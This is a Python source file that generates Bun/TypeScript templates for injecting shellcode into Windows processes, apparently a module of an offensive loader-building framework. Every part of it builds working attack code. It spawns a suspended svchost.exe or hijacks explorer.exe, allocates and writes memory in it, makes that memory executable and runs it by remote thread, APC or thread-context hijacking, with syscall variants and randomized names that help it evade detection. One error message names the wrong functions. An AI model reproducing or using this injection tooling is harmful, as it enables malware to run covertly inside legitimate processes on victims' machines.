from string import Template
import os

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

        self.mode = 'spawn'
        if 'mode' in arguments:
            if arguments['mode'] in ['inject', 'spawn']:
                self.mode = arguments['mode']

        if self.mode == 'inject':
            self.target = 'explorer.exe'
        elif self.mode == 'spawn':
            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'

        self.allocate = 'VirtualAllocEx'
        if 'allocate' in arguments:
            if arguments['allocate'] in ['VirtualAllocEx', 'NtAllocateVirtualMemory']:
                self.allocate = arguments['allocate']
            else:
                print('allocate argument must be VirtualAllocEx, or NtAllocateVirtualMemory')
                exit(0)
        
        self.write = 'WriteProcessMemory'
        if 'write' in arguments:
            if arguments['write'] in ['WriteProcessMemory', 'NtWriteVirtualMemory']:
                self.write = arguments['write']
            else:
                print('Write argument must be WriteProcessMemory, or NtWriteVirtualMemory')
                exit(0)

        self.protect = 'VirtualProtectEx'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtectEx', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.execute = 'CreateRemoteThread'
        if 'execute' in arguments:
            if arguments['execute'] in ['CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx', 'NtQueueApcThread']:
                self.execute = arguments['execute']
            else:
                print('execute argument must be CreateRemoteThread, QueueUserAPC, SetThreadContext, NtQueueApcThread, or NtCreateThreadEx')
                exit(0)

        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject', 'None']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject, NtWaitForSingleObject, or None')
                exit(0)
        else:
            if self.execute in ['NtCreateThreadEx', 'CreateRemoteThread']:
                self.wait = 'WaitForSingleObject'
            else:
                self.wait = 'None'

    def imports(self) -> list[str]:
        return ['import { ptr } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection, ProcessCreationFlags, ProcessAccessRights, ThreadAccessRights, ToolhelpSnapshotFlags } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = ''
        if self.mode == 'spawn':
            template += Template("""    
    const si = new Uint8Array(104);
    new DataView(si.buffer).setUint32(0, 104, true);
    const pi = new Uint8Array(24);
    const cmdline = Buffer.from('$target\\0', 'utf8');

    {CreateProcessA}(null, ptr(cmdline), null, null, 0, ProcessCreationFlags.CREATE_SUSPENDED, null, null, ptr(si), ptr(pi));

    const view = new DataView(pi.buffer);
    const hProcess = view.getBigUint64(0, true);
    const hThread = view.getBigUint64(8, true);
""").substitute(target=self.target)
        elif self.mode == 'inject':
            template += Template("""
    let hProcSnap = {CreateToolhelp32Snapshot}(ToolhelpSnapshotFlags.TH32CS_SNAPPROCESS, 0);
    let pe32 = new Uint8Array(336);
    let pe32_view = new DataView(pe32.buffer);
    pe32_view.setUint32(0, 336, true);
    let pid = 0;

    {Process32First}(hProcSnap, ptr(pe32));

    while ({Process32Next}(hProcSnap, ptr(pe32))) {{
        let processname = new Uint8Array(pe32_view.buffer, 44, 260);
        let nullIndex = processname.indexOf(0);
        let text = new TextDecoder('utf-8').decode(processname.subarray(0, nullIndex));
        if (text == '$target'){{
            pid = pe32_view.getUint32(8, true);
            console.log(pid);
            break;
        }}
    }}
    let hProcess = {OpenProcess}( ProcessAccessRights.PROCESS_CREATE_THREAD | ProcessAccessRights.PROCESS_QUERY_INFORMATION | ProcessAccessRights.PROCESS_VM_OPERATION | ProcessAccessRights.PROCESS_VM_READ | ProcessAccessRights.PROCESS_VM_WRITE, false, pid);

    let hThreadSnap = {CreateToolhelp32Snapshot}(ToolhelpSnapshotFlags.TH32CS_SNAPTHREAD, 0);
    let th32 = new Uint8Array(28);
    let th32_view = new DataView(th32.buffer);
    th32_view.setUint32(0, 28, true);
    let hThread = 0;

    {Thread32First}(hThreadSnap, ptr(th32_view));

    while ({Thread32Next}(hThreadSnap, ptr(th32_view)))
    {{
        let parentpid = th32_view.getUint32(12, true);
        let threadid = th32_view.getUint32(8, true);
        if (parentpid == pid)
        {{
            hThread = {OpenThread}(ThreadAccessRights.THREAD_ALL_ACCESS, false, threadid);
            break;
        }}
    }}

""").substitute(target=self.target)

        if self.allocate == 'VirtualAllocEx':
            template += """
    const address = {VirtualAllocEx}(hProcess, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
"""
        elif self.allocate == 'NtAllocateVirtualMemory':
            template += """
    let regionSize = new BigUint64Array(1);
    let baseAddress = new BigUint64Array(1);
    regionSize[0] = {shellcodeSize}n;
    let status = {NtAllocateVirtualMemory}(hProcess, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
    let address = baseAddress[0];
"""

        template += """
    {transformers}
"""

        if self.write == 'WriteProcessMemory':
            template += """
    let bytesWritten = new BigUint64Array(1);
    {WriteProcessMemory}(hProcess, address, ptr(shellcode), {shellcodeSize}n, bytesWritten);
"""
        elif self.write == "NtWriteVirtualMemory":
            template += """
    let bytesWritten = new BigUint64Array(1);
    {NtWriteVirtualMemory}(hProcess, BigInt(address), ptr(shellcode), {shellcodeSize}n, ptr(bytesWritten));
"""

        if self.protect == 'VirtualProtectEx':
            template += Template("""
    let oldProtect = new Uint32Array(1);
    {VirtualProtectEx}(hProcess, address, {shellcodeSize}n, MemoryProtection.$memoryPermission, oldProtect)
""").substitute(memoryPermission=self.memoryPermission)
        elif self.protect == 'NtProtectVirtualMemory':
            template += Template("""
    let oldProtect = new Uint32Array(1);;
    let regionSize_$n = new BigUint64Array(1);
    regionSize_$n[0] = {shellcodeSize}n;
    let baseAddress_$n = new BigUint64Array([BigInt(address)]);
    {NtProtectVirtualMemory}(hProcess, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.PAGE_EXECUTE_READ, ptr(oldProtect));
""").substitute(n=os.urandom(4).hex())

        if self.execute == 'CreateRemoteThread':
            template += """
    const newThread = {CreateRemoteThread}(hProcess, null, 0, address, 0, 0, null);
"""
        elif self.execute == 'QueueUserAPC':
            template += """
    {QueueUserAPC}(address, hThread, 0);
    {ResumeThread}(hThread);
"""
        elif self.execute == 'NtCreateThreadEx':
            template += """
    let hThreadBuffer = new BigUint64Array(1); 
    {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, hProcess, address, 0n, 0, 0n, 0n, 0n, null);
    let newThread = hThreadBuffer[0];
"""
        elif self.execute == 'SetThreadContext':
            template += Template("""
    let context = new Uint8Array(0x4d0); 
    const view_$n = new DataView(context.buffer);
    view_$n.setUint32(0x30, 0x00100001, true);
    {GetThreadContext}(hThread, ptr(context)); 
    view_$n.setBigUint64(0xf8, address, true);
    {SetThreadContext}(hThread, ptr(context));
""").substitute(n=os.urandom(4).hex())
        elif self.execute == 'NtQueueApcThread':
            template += """
    {NtQueueApcThread}(hThread, address, null, null, 0);
"""

        if self.wait == 'WaitForSingleObject':
            template += """
    {WaitForSingleObject}(newThread, 500);
    {CloseHandle}(newThread);
"""
        elif self.wait == 'None':
            template += """
    {ResumeThread}(hThread);
"""
        elif self.wait == 'NtWaitForSingleObject':
            template += """
    {NtWaitForSingleObject}(newThread, 0);
"""

        if self.allocate == 'VirtualAllocEx':
            template += """
    {VirtualFree}(address, 0, MemoryAllocationType.MEM_RELEASE) ;
"""
        elif self.allocate == 'NtAllocateVirtualMemory':
            template += """
    {NtFreeVirtualMemory}(-1n, address);
"""

        return template